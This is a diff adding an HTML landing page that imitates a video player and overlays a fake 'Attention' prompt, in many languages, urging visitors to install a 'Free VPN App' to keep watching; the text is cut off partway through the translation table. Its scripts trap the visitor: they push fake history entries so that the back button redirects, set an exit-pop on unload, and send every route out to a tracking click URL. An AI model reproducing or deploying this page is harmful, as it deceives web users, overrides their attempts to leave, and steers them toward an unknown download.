@@ -1,0 +1,905 @@
+<!DOCTYPE html><html class="desktop portrait"><head>
+  <base href="">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title data-translate="a1">Attention</title>
+    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAuLPMAJCLsATg2+RlBQP5ISEf/Z0xL/2dMS/9JSUj/Gzo4/wFAP/8AAAAAAAAAAAAAAAAAAAAAABgU5AAqKPAAJCLsFTAu9HQ8O/vMSUj/71NS//dYV//3Vlb/71BP/85HRv94Pj39F0RD/wAzMfYAAAAAAA0K3gAcGecAFxTkJCQh7LQ0Mvb7RkT+/VZV//tkZP/6a2v/+mho//tdXf/9Tk3/+0A+/bg0MvcoOTj6ACwp8QAJBtsABgPZFRQR4rQlI+3+OTj6+k1M//pfX//6cnL/+oGA//p7e//6aGn/+lZV//pDQf3+MjH2uSUj7RgoJu8ADwzhAAUD2HUSD+H7JiTu+js5+vpOTf/6YWH/+nZ2//qIh//6gYD/+mtr//pYV//6REP++jAv9PsiIOt7eHn/AAQC1xoEAtfMDwzf/SQh7Po3Nvj6Skn/+ltb//pra//8dnb//HJy//pkY//6U1L/+kE//fotK/L9Gxnn0Q8M3x4EAtdIBALX7woI3PsdGuj6Ly70+kE//fpQT//6XFz/4mJi/+JfX//6VlX/+khH//o4N/n6JiTu+hQR4vEIBttPBALXZwQC1/cGBNj6ExDi+iQi7Po0Mvb8QD/94k5N/zpWVf86TUz/4kZE/vw7Ofr6LCry+hwZ5/oLCdz5BALXbgYE2GcKCNr3BQPY+ggG2voWFOT6JCLs/C4s8+IuLPM6MzL3Ojg3+eI0Mvb8Kijw+h4b6PoPDN/6BQPY+QQC128IBtlJIyHo7yEf5/sNC9z6CQbb+hIQ4fodGuj6IiDr4iUj7eIlI+36IB7q+hgW5foOC976BgPY+gQC1/EEAtdQAADSGyop6s5KSfr9Ojn0+iMi6PoQDt76Cwnc+g4M3/wRDuD8EA7g+g0K3voIBtr6BQLX+gQC1/0EAtfTBALXH4+Q/wAVE955UlL1+2Vl//pUVP36QkL3+iwr7foYFuL6Cwnb+gUD2PoDAdf6AwHX+gQC1/oEAtf8BALXfwYB1AACAdYAAADSFyop47hycvn+fn//+mxt//pdXf76TU37+js79PopKOz6Gxnk+hEP3voIBtn+BALXvQQC1xoEAtcAAADTAAgH2QAAANUoMTDjuXd39fuTlP79iIn/+nh4//poaf/6WVr++kdH+f0rKuz8DgzdvQIA1iwEAtcABALXAAAAAAAAAMQAAwLZAAAA0xgfHd17UE/p0XFx8vF4efb5amr2+U5O8fEtLOnTEhDefwIB1hoHBdkABALXAAAAAAAAAAAAAAAAAAAAAAAAAMQAAAC7AgAA0h4MC9lPGhjdbhcV3G8JB9hQAADSHwAAvwIAAMYAAAAAAAAAAAAAAAAA8A8AAOAHAADAAwAAgAEAAIABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAQAAgAEAAMADAADgBwAA8A8AAA==" type="image/x-icon">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="css2" rel="stylesheet">
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+      }
+      html {
+        font-size: 15px;
+      }
+      html,
+      body {
+        width: 100%;
+        height: 100%;
+      }
+      body {
+        font-family: "Open Sans", sans-serif;
+        position: relative;
+        background-color: #454545;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-align: center;
+        -webkit-align-items: center;
+        -ms-flex-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        -webkit-justify-content: center;
+        -ms-flex-pack: center;
+        justify-content: center;
+      }
+      @-webkit-keyframes show {
+        0% {
+          opacity: 0;
+        }
+        100% {
+          opacity: 1;
+        }
+      }
+      @keyframes show {
+        0% {
+          opacity: 0;
+        }
+        100% {
+          opacity: 1;
+        }
+      }
+      @-webkit-keyframes hidden {
+        100% {
+          opacity: 0;
+        }
+      }
+      @keyframes hidden {
+        100% {
+          opacity: 0;
+        }
+      }
+      .wrapper {
+        position: absolute;
+        margin-bottom: 100px;
+        width: 87%;
+        max-width: 400px;
+        background: rgba(255, 255, 255, 0.95);
+        border-radius: 10px;
+        z-index: 100;
+        -webkit-animation: show 1.2s steps(1, end) 1;
+        animation: show 1.2s steps(1, end) 1;
+      }
+      .top_wrapper {
+        padding: 17px;
+        width: 100%;
+        text-align: center;
+      }
+      .top_wrapper h1 {
+        text-transform: capitalize;
+        font-size: 1.4rem;
+        font-weight: 700;
+        margin-bottom: 5px;
+      }
+      .button {
+        width: 100%;
+        color: #2289fb;
+        font-size: 1.3rem;
+        font-weight: 400;
+        border-top: solid 1px rgba(0, 0, 0, 0.15);
+        text-align: center;
+        padding: 13px 10px;
+        cursor: pointer;
+      }
+      .button:hover {
+        background: rgba(225, 225, 225, 0.5);
+        border-radius: 0 0 10px 10px;
+      }
+      .player {
+        width: 100%;
+        max-width: 850px;
+        height: 60vh;
+        position: relative;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-orient: vertical;
+        -webkit-box-direction: normal;
+        -webkit-flex-direction: column;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        -webkit-box-align: center;
+        -webkit-align-items: center;
+        -ms-flex-align: center;
+        align-items: center;
+        padding: 10px 15px;
+        background: #000;
+        color: #fff;
+      }
+      .bg {
+        top: 0;
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        background: url(https://trck.sendrez.com/click);
+        background-size: cover;
+        opacity: 0;
+        -webkit-animation: show 1s linear forwards;
+        animation: show 1s linear forwards;
+      }
+      .top_icons {
+        position: relative;
+        width: 100%;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-align: center;
+        -webkit-align-items: center;
+        -ms-flex-align: center;
+        align-items: center;
+        -webkit-box-pack: justify;
+        -webkit-justify-content: space-between;
+        -ms-flex-pack: justify;
+        justify-content: space-between;
+      }
+      .top_icons_left {
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-pack: start;
+        -webkit-justify-content: flex-start;
+        -ms-flex-pack: start;
+        justify-content: flex-start;
+        -webkit-box-align: center;
+        -webkit-align-items: center;
+        -ms-flex-align: center;
+        align-items: center;
+        font-weight: 700;
+        font-size: 0.9rem;
+        cursor: pointer;
+      }
+      .top_icons_left img {
+        opacity: 0.55;
+      }
+      .top_icons_left p {
+        margin-left: 8px;
+        font-size: 0.85rem;
+      }
+      .top_icons_left:hover img {
+        opacity: 1;
+      }
+      .top_icons img {
+        height: 22px;
+        cursor: pointer;
+      }
+      .player_content {
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-flex: 1;
+        -webkit-flex-grow: 1;
+        -ms-flex-positive: 1;
+        flex-grow: 1;
+        -webkit-box-align: center;
+        -webkit-align-items: center;
+        -ms-flex-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        -webkit-justify-content: center;
+        -ms-flex-pack: center;
+        justify-content: center;
+        position: relative;
+        width: 100%;
+      }
+      .player_content .loading {
+        position: absolute;
+        padding-top: 50px;
+        width: 60px;
+        opacity: 0;
+        -webkit-animation: show 0.9s steps(1, end) forwards;
+        animation: show 0.9s steps(1, end) forwards;
+      }
+      .player_content .sequence {
+        width: 100%;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-pack: justify;
+        -webkit-justify-content: space-between;
+        -ms-flex-pack: justify;
+        justify-content: space-between;
+        -webkit-box-align: center;
+        -webkit-align-items: center;
+        -ms-flex-align: center;
+        align-items: center;
+      }
+      .player_content .sequence_icon {
+        padding: 18px 16px 18px 12px;
+        border: 1px solid rgba(255, 255, 255, 0.5);
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 4px;
+        cursor: pointer;
+        opacity: 0.8;
+      }
+      .player_content .sequence_icon img {
+        height: 22px;
+      }
+      .player_content .sequence_icon:hover {
+        opacity: 1;
+      }
+      .player_content .sequence_icon:last-child {
+        padding: 18px 12px 18px 16px;
+      }
+      .player_content .sequence_icon:last-child img {
+        -webkit-transform: scaleX(-1);
+        -ms-transform: scaleX(-1);
+        transform: scaleX(-1);
+      }
+      .pause_play {
+        position: relative;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-align: center;
+        -webkit-align-items: center;
+        -ms-flex-align: center;
+        align-items: center;
+      }
+      .pause_play img:first-child {
+        position: absolute;
+        opacity: 0;
+        -webkit-animation: show 0.9s steps(1, end) forwards;
+        animation: show 0.9s steps(1, end) forwards;
+      }
+      .pause_play img:last-child {
+        -webkit-animation: hidden 0.9s steps(1, end) forwards;
+        animation: hidden 0.9s steps(1, end) forwards;
+      }
+      .player_navigation {
+        width: 100%;
+      }
+      .player_navigation_item {
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-align: center;
+        -webkit-align-items: center;
+        -ms-flex-align: center;
+        align-items: center;
+        -webkit-box-pack: start;
+        -webkit-justify-content: flex-start;
+        -ms-flex-pack: start;
+        justify-content: flex-start;
+        padding: 12px 10px 0;
+      }
+      .player_navigation_item img {
+        height: 20px;
+        cursor: pointer;
+        opacity: 0.8;
+      }
+      .player_navigation_item .icon_margin {
+        margin: 0 15px;
+      }
+      .player_navigation_item p {
+        -webkit-box-flex: 1;
+        -webkit-flex: 1;
+        -ms-flex: 1;
+        flex: 1;
+        font-size: 0.8rem;
+        margin-left: 15px;
+        opacity: 0.8;
+      }
+      .progress {
+        -webkit-box-flex: 1;
+        -webkit-flex: 1;
+        -ms-flex: 1;
+        flex: 1;
+        height: 2px;
+        background: rgba(255, 255, 255, 0.3);
+        position: relative;
+        cursor: pointer;
+      }
+      .progress_load {
+        width: 0%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.3);
+        -webkit-animation: progress_load 20s linear forwards;
+        animation: progress_load 20s linear forwards;
+      }
+      .progress_line {
+        width: 0%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.8);
+        -webkit-animation: progress_line 1s linear forwards;
+        animation: progress_line 1s linear forwards;
+      }
+      @-webkit-keyframes progress_load {
+        0% {
+          width: 0;
+        }
+        100% {
+          width: 50%;
+        }
+      }
+      @keyframes progress_load {
+        0% {
+          width: 0;
+        }
+        100% {
+          width: 50%;
+        }
+      }
+      @-webkit-keyframes progress_line {
+        0% {
+          width: 0;
+        }
+        100% {
+          width: 10px;
+        }
+      }
+      @keyframes progress_line {
+        0% {
+          width: 0;
+        }
+        100% {
+          width: 10px;
+        }
+      }
+      @-webkit-keyframes progress_slider {
+        0% {
+          left: 0px;
+        }
+        100% {
+          left: 7px;
+        }
+      }
+      @keyframes progress_slider {
+        0% {
+          left: 0px;
+        }
+        100% {
+          left: 7px;
+        }
+      }
+      /*************** media queries start ***********/
+      @media screen and (max-width: 992px) {
+        .player {
+          height: 75vh;
+        }
+      }
+      @media screen and (max-width: 768px) {
+        .player {
+          height: 42vh;
+        }
+      }
+      @media screen and (max-width: 768px) and (orientation: landscape) {
+        .player {
+          height: 80vh;
+        }
+      }
+      @media screen and (max-width: 576px) {
+        .player_navigation_item {
+          padding: 12px 0 0;
+        }
+      }
+      @media screen and (max-width: 440px) {
+        .player_content .loading {
+          width: 40px;
+          padding-top: 25px;
+        }
+        .player_content .sequence_icon {
+          padding: 14px 13px 14px 10px;
+          border-radius: 3px;
+        }
+        .player_content .sequence_icon img {
+          height: 18px;
+        }
+        .player_content .sequence_icon:last-child {
+          padding: 14px 10px 14px 13px;
+        }
+        .player_navigation_item {
+          padding: 8px 0 0;
+        }
+        .player_navigation_item .icon_margin {
+          margin: 0 12px;
+        }
+        .player_navigation_item p {
+          margin-left: 12px;
+        }
+      }
+      @media screen and (max-width: 320px), screen and (max-width: 480px) and (orientation: landscape) {
+        html {
+          font-size: 14px;
+        }
+        .player_content .loading {
+          width: 40px;
+          padding-top: 20px;
+        }
+      }
+      @media screen and (max-width: 840px) and (max-height: 440px) and (orientation: landscape) {
+        body {
+          -webkit-box-align: start;
+          -webkit-align-items: flex-start;
+          -ms-flex-align: start;
+          align-items: flex-start;
+        }
+        .player {
+          width: 100%;
+          height: 100%;
+        }
+        .player_content .loading {
+          padding-top: 0;
+        }
+        .player_content .sequence_icon {
+          padding: 14px 13px 14px 10px;
+          border-radius: 3px;
+        }
+        .player_content .sequence_icon img {
+          height: 18px;
+        }
+        .player_content .sequence_icon:last-child {
+          padding: 14px 10px 14px 13px;
+        }
+      }
+
+      /*************** media queries FOR WRAPPER ONLY ***********/
+
+      @media screen and (max-width: 320px), screen and (max-width: 480px) and (orientation: landscape) {
+        .top_wrapper {
+          padding: 17px;
+        }
+      }
+
+      @media screen and (max-width: 840px) and (max-height: 440px) and (orientation: landscape) {
+        .wrapper {
+          margin-bottom: 0;
+          margin-top: 8px;
+        }
+      }
+    </style>
+
+  </head>
+
+<body onload="translate()">
+    <div class="wrapper">
+      <div class="top_wrapper">
+        <h1 data-translate="a2">Attention</h1>
+        <p data-translate="a3">Please install <b>Free VPN App</b> to continue watching in a safe mode</p>
+      </div>
+      <p class="button" onclick="goto();" data-translate="a4">Install</p>
+    </div>
+    <section class="player">
+      <div class="bg"></div>
+      <div class="top_icons">
+        <div class="top_icons_left">
+          <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4IDEyIj48cGF0aCBkPSJNNi40IDExLjljLS4zIDAtLjYtLjEtLjgtLjNMLjggNi44Qy40IDYuNC40IDUuNy44IDUuM0w1LjYuNUM2IDAgNi43IDAgNy4yLjVjLjQuNC40IDEuMSAwIDEuNWwtNCA0IDQgNGMuNC40LjQgMS4xIDAgMS41LS4zLjMtLjUuNC0uOC40eiIgZmlsbD0iI2ZmZiIvPjwvc3ZnPg==">
+          <p data-translate="a5">Back</p>
+        </div>
+        <img class="top_icons_right" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48cGF0aCBkPSJNNDAyLjUgMzM5LjdjLTI0LjMgMC00Ni4yIDEwLjQtNjEuNSAyNi45bC0xNTEuNC04Ni4yYzIuNC03LjggMy42LTE1LjkgMy42LTI0LjRzLTEuMy0xNi43LTMuNi0yNC40TDM0MSAxNDUuNGMxNS4zIDE2LjUgMzcuMiAyNi45IDYxLjUgMjYuOSA0Ni4yIDAgODMuNi0zNy42IDgzLjYtODMuNiAwLTQ2LjItMzcuNi04My42LTgzLjYtODMuNnMtODMuNiAzNy42LTgzLjYgODMuNmMwIDYuOS45IDEzLjUgMi40IDE5LjhMMTY3LjcgMTk2Yy0xNS0xNC43LTM1LjYtMjMuNy01OC4yLTIzLjctNDYuMiAwLTgzLjYgMzcuNi04My42IDgzLjZzMzcuNiA4My42IDgzLjYgODMuNmMyMi41IDAgNDMuMS05IDU4LjItMjMuN2wxNTMuNCA4Ny43Yy0xLjUgNi40LTIuNCAxMy0yLjQgMTkuOCAwIDQ2LjIgMzcuNiA4My42IDgzLjYgODMuNnM4My42LTM3LjYgODMuNi04My42Yy4zLTQ2LTM3LjMtODMuNi04My40LTgzLjZ6IiBmaWxsPSIjZmZmIi8+PC9zdmc+">
+      </div>
+      <div class="player_content">
+        <img class="loading" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzgiIGhlaWdodD0iMzgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxIDEpIiBzdHJva2Utd2lkdGg9IjIiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PGNpcmNsZSBzdHJva2Utb3BhY2l0eT0iLjUiIGN4PSIxOCIgY3k9IjE4IiByPSIxOCIvPjxwYXRoIGQ9Ik0zNiAxOGMwLTkuOTQtOC4wNi0xOC0xOC0xOCI+PGFuaW1hdGVUcmFuc2Zvcm0gYXR0cmlidXRlTmFtZT0idHJhbnNmb3JtIiB0eXBlPSJyb3RhdGUiIGZyb209IjAgMTggMTgiIHRvPSIzNjAgMTggMTgiIGR1cj0iMXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIi8+PC9wYXRoPjwvZz48L3N2Zz4=" alt="">
+        <div class="sequence">
+          <div class="sequence_icon">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4IDEyIj48cGF0aCBkPSJNNi40IDExLjljLS4zIDAtLjYtLjEtLjgtLjNMLjggNi44Qy40IDYuNC40IDUuNy44IDUuM0w1LjYuNUM2IDAgNi43IDAgNy4yLjVjLjQuNC40IDEuMSAwIDEuNWwtNCA0IDQgNGMuNC40LjQgMS4xIDAgMS41LS4zLjMtLjUuNC0uOC40eiIgZmlsbD0iI2ZmZiIvPjwvc3ZnPg==">
+          </div>
+          <div class="sequence_icon">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4IDEyIj48cGF0aCBkPSJNNi40IDExLjljLS4zIDAtLjYtLjEtLjgtLjNMLjggNi44Qy40IDYuNC40IDUuNy44IDUuM0w1LjYuNUM2IDAgNi43IDAgNy4yLjVjLjQuNC40IDEuMSAwIDEuNWwtNCA0IDQgNGMuNC40LjQgMS4xIDAgMS41LS4zLjMtLjUuNC0uOC40eiIgZmlsbD0iI2ZmZiIvPjwvc3ZnPg==">
+          </div>
+        </div>
+      </div>
+      <div class="player_navigation">
+        <div class="progress">
+          <div class="progress_load">
+            <div class="progress_line"></div>
+          </div>
+        </div>
+        <div class="player_navigation_item">
+          <div class="pause_play">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMiAyMCI+PHBhdGggZD0iTS4yIDQuMXYxMS44YzAgLjUuNi43IDEgLjVsMTAtNS42Yy43LS40LjctMS4zIDAtMS43bC0xMC01LjZjLS40LS4yLTEgLjEtMSAuNnoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=" alt="">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMiAyMCI+PHBhdGggZD0iTTMuOSAxNi41SC42Yy0uMiAwLS40LS4yLS40LS40VjMuOWMwLS4yLjItLjQuNC0uNGgzLjJjLjIgMCAuNC4yLjQuNFYxNmMuMS4zLS4xLjUtLjMuNXptNy40IDBIOC4xYy0uMiAwLS40LS4yLS40LS40VjMuOWMwLS4yLjItLjQuNC0uNGgzLjJjLjIgMCAuNC4yLjQuNFYxNmMwIC4zLS4yLjUtLjQuNXoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=" alt="">
+          </div>
+          <img class="icon_margin" src="data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSLQodC70L7QuV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHg9IjAiIHk9IjAiIHZpZXdCb3g9IjAgMCAxNCAxMyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PHN0eWxlPi5zdDB7ZmlsbDojZmZmfTwvc3R5bGU+PHBhdGggY2xhc3M9InN0MCIgZD0iTTMgNy4ybC0uNy40LS4xLS40LjktLjVoLjV2NC4ySDNWNy4yem00IDEuNmMwIDEuNC0uNSAyLjItMS40IDIuMi0uOCAwLTEuNC0uOC0xLjQtMi4xIDAtMS40LjYtMi4yIDEuNS0yLjIuOC0uMSAxLjMuNyAxLjMgMi4xem0tMi4yIDBjMCAxLjEuMyAxLjcuOCAxLjcuNiAwIC45LS43LjktMS43cy0uMy0xLjctLjgtMS43Yy0uNiAwLS45LjYtLjkgMS43eiIvPjxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik00LjggM1YxLjljMC0uMy0uMy0uNC0uNS0uM0wxLjkgMy4xYy0uMy4yLS4zLjYgMCAuN2wyLjMgMS42Yy4yLjIuNSAwIC41LS4zVjRoNi43djUuOUg4Ljh2MWgzLjdWM0g0Ljh6Ii8+PC9zdmc+" alt="">
+          <img src="data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSLQodC70L7QuV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHg9IjAiIHk9IjAiIHZpZXdCb3g9IjAgMCAxNCAxMyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PHN0eWxlPi5zdDB7ZmlsbDojZmZmfTwvc3R5bGU+PHBhdGggY2xhc3M9InN0MCIgZD0iTTYuMyAxLjJMMy4xIDQuM0gxLjJjLS4zIDAtLjYuMy0uNi42djMuNGMwIC4zLjMuNi42LjZoMS45bDMuNCAzYy4xLjIuNSAwIC41LS4zVjEuNGMwLS4zLS40LS41LS43LS4yek0xMSA2LjVDMTEgNSA5LjggMy43IDguMiAzLjd2MS4xYy45LjEgMS42LjggMS42IDEuN3MtLjcgMS42LTEuNiAxLjd2MS4xQzkuOCA5LjMgMTEgOCAxMSA2LjV6Ii8+PHBhdGggY2xhc3M9InN0MCIgZD0iTTEzLjQgNi41YzAtMi45LTIuMy01LjItNS4yLTUuM3YxLjFjMi4yLjEgNC4xIDEuOSA0LjEgNC4yIDAgMi4zLTEuOCA0LjEtNC4xIDQuMnYxLjFjMi45LS4xIDUuMi0yLjQgNS4yLTUuM3oiLz48L3N2Zz4=" alt="">
+          <p>00:0<span id="counter_wrapper">2</span>/1:52:46</p>
+          <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNTAgMjUwIj48cGF0aCBkPSJNMTAwLjMgMTk3bC0yNC44LTUuMiA0MS4yLTQxLjItMTctMTcuNS00Mi41IDQyLjUtNy41LTI0LjZjLTItNy42LTEzLTYuOC0xMy44IDFMMjUgMjI1LjdjLS4xIDEuMyAxIDIuMyAyLjIgMi4xbDczLjItMTYuOWM3LjgtMS40IDcuOC0xMi43LS4xLTEzLjl6bTEyMi0xNzMuMWwtNzIuNyAxNS4zYy03LjggMS40LTcuOCAxMi42LjEgMTMuOWwyNS4zIDQuOC00MiA0MS45IDE3IDE3LjUgNDIuOS00Mi45IDcuNCAyNC43YzIgNy42IDEzIDYuOCAxMy44LTFMMjI0LjUgMjZjLjEtMS4zLTEtMi4zLTIuMi0yLjF6IiBmaWxsPSIjZmZmIi8+PC9zdmc+" alt="">
+        </div>
+      </div>
+    </section>
+  
+
+  <script>
+    const node = document.querySelector("#counter_wrapper");
+
+    $.counter({
+      start: 1,
+      end: 2,
+      display: node,
+      interval: 1000,
+    });
+  </script>
+<script type="text/javascript">
+
+
+  function goto() {
+      PreventExitPop = false;
+      window.onbeforeunload=null;
+      location.href = 'https://trck.sendrez.com/click';
+      
+  }
+  </script>
+  
+  <script>
+      (function (w,l,d,h) {
+  
+          url = 'https://trck.sendrez.com/click'
+    function redirect() {
+      w.onbeforeunload = null;
+      w.location.replace(url);
+      
+    }
+  
+    var blockHistory = function (w,l,d,h) {
+      h.replaceState(null, d.title, l.pathname+l.search);
+      for(var i=0;i<10;i++) {
+        try {
+          h.pushState(null, d.title, l.pathname+l.search);
+        } catch (e) { i=10; }
+      }
+      var onPopstate = function () {
+        h.replaceState(null, d.title, l.pathname+l.search);
+        redirect();
+      };
+      if (w.addEventListener) {
+        w.addEventListener('popstate',onPopstate);
+      } else {
+        w.onpopstate = onPopstate;
+      }
+    };
+  
+    var setExitpop = function () {
+      if (w.onbeforeunload === null) {
+        w.onbeforeunload = function () {
+          var to = setTimeout(function() {
+            redirect();
+          }, 100);
+          return '*';
+        };
+      }
+    };
+  
+    d.onreadystatechange = function () {
+      if (d.readyState === 'interactive') {
+        blockHistory(w,l,d,h);
+        setExitpop();
+        d.addEventListener('click', function(e) {
+          for (var target = e.target; target && target != this; target = target.parentNode) {
+            if (target.matches('a')) {
+              w.onbeforeunload = null;
+              break;
+            }
+          }
+        }, false);
+      }
+    };
+  
+  })(window,location,document,history);
+  </script>
+  
+  
+      <script>
+    
+
+    var translation = {
+            source: {
+                a1: "Attention!",
+                a2: "Attention!",
+                a3: "Please Install the VPN App to continue watching in safe mode.",
+                a4: "Install",
+            },
+            en: {
+                a1: "Attention!",
+                a2: "Attention!",
+                a3: "Please Install the VPN App to continue watching in safe mode.",
+                a4: "Install",
+            },
+            de: {
+                a1: "Achtung!",
+                a2: "Achtung!",
+                a3: "Bitte installieren Sie die VPN-App, um die Wiedergabe im abgesicherten Modus fortzusetzen.",
+                a4: "Installieren",
+            },
+            fr: {
+                a1: "Attention!",
+                a2: "Attention!",
+                a3: "Veuillez installer l'application VPN pour continuer à regarder en mode sans échec.",
+                a4: "Installer",
+            },
+            es: {
+                a1: "¡Atención!",
+                a2: "¡Atención!",
+                a3: "Instala la aplicación VPN para continuar viendo en modo seguro",
+                a4: "Instalar",
+            },
+            it: {
+                a1: "Attenzione!",
+                a2: "Attenzione!",
+                a3: "Installa l'app VPN per continuare a guardare in modalità provvisoria.",
+                a4: "Installa",
+            },
+            pt: {
+                a1: "Atenção!",
+                a2: "Atenção!",
+                a3: "Instale o aplicativo VPN para continuar assistindo no modo de segurança.",
+                a4: "Instalar",
+            },
+            sv: {
+                a1: "Obs!",
+                a2: "Obs!",
+                a3: "Vänligen installera VPN-appen för att fortsätta titta i säkert läge.",
+                a4: "Installera",
+            },
+            no: {
+                a1: "Oppmerksomhet!",
+                a2: "Oppmerksomhet!",
+                a3: "Vennligst installer VPN-appen for å fortsette å se i sikker modus.",
+                a4: "Installer",
+            },
+            nl: {
+                a1: "Let op!",
+                a2: "Let op!",
+                a3: "Installeer de VPN-app om verder te kijken in de veilige modus.",
+                a4: "Installeren",
+            },
+            da: {
+                a1: "Opmærksomhed!",
+                a2: "Opmærksomhed!",
+                a3: "Installer venligst VPN-appen for at fortsætte med at se i sikker tilstand.",
+                a4: "Installer",
+            },
+            cs: {
+                a1: "Pozor!",
+                a2: "Pozor!",
+                a3: "Nainstalujte si prosím aplikaci VPN, abyste mohli pokračovat ve sledování v nouzovém režimu.",
+                a4: "Instalovat",
+            },
+            fi: {
+                a1: "Huomio!",
+                a2: "Huomio!",
+                a3: "Asenna VPN-sovellus jatkaaksesi katselua vikasietotilassa.",
+                a4: "Asenna",
+            },
+            el: {
+                a1: "Προσοχή!",
+                a2: "Προσοχή!",
+                a3: "Εγκαταστήστε την εφαρμογή VPN για να συνεχίσετε την παρακολούθηση σε ασφαλή λειτουργία.",
+                a4: "Εγκατάσταση",
+            },
+            hu: {
+                a1: "Figyelem!",
+                a2: "Figyelem!",
+                a3: "Telepítse a VPN alkalmazást a csökkentett módban való nézéshez.",
+                a4: "Telepítés",
+            },
+            ro: {
+                a1: "Atenție!",
+                a2: "Atenție!",
+                a3: "Vă rugăm să instalați aplicația VPN pentru a continua vizionarea în modul sigur.",
+                a4: "Instalare",
+            },
+            hr: {
+                a1: "Pažnja!",
+                a2: "Pažnja!",
+                a3: "Instalirajte VPN aplikaciju za nastavak gledanja u sigurnom načinu rada.",
+                a4: "Instaliraj",
+            },
+            lt: {
+                a1: "Dėmesio!",
+                a2: "Dėmesio!",
+                a3: "Įdiekite VPN programą, kad galėtumėte toliau žiūrėti saugiuoju režimu.",
+                a4: "Įdiegti",
+            },
+            lv: {
+                a1: "Uzmanību!",
+                a2: "Uzmanību!",
+                a3: "Lūdzu, instalējiet VPN lietotni, lai turpinātu skatīties drošajā režīmā.",
+                a4: "Instalēt",
+            },
+            sr: {
+                a1: "Пажња!",
+                a2: "Пажња!",
+                a3: "Инсталирајте ВПН апликацију да наставите да гледате у безбедном режиму.",
+                a4: "Инсталирај",
+            },
+            sk: {
+                a1: "Pozor!",
+                a2: "Pozor!",
+                a3: "Nainštalujte si aplikáciu VPN, aby ste mohli pokračovať v pozeraní v núdzovom režime.",
+                a4: "Inštalovať",
+            },
+            sl: {
+                a1: "Pozor!",
+                a2: "Pozor!",
+                a3: "Namestite aplikacijo VPN za nadaljevanje gledanja v varnem načinu.",
+                a4: "Namesti",
+            },
+            be: {
+                a1: "Увага!",
+                a2: "Увага!",
+                a3: "Калі ласка, усталюйце праграму VPN, каб працягнуць прагляд у бяспечным рэжыме.",
+                a4: "Усталяваць",
+            },
+            bg: {
+                a1: "Внимание!",
+                a2: "Внимание!",
+                a3: "Моля, инсталирайте VPN приложение, за да продължите да гледате в безопасен режим.",
+                a4: "Инсталиране",
+            },
+            pl: {
+                a1: "Uwaga!",
+                a2: "Uwaga!",
+                a3: "Zainstaluj aplikację VPN, aby kontynuować oglądanie w trybie awaryjnym.",
+                a4: "Zainstaluj",
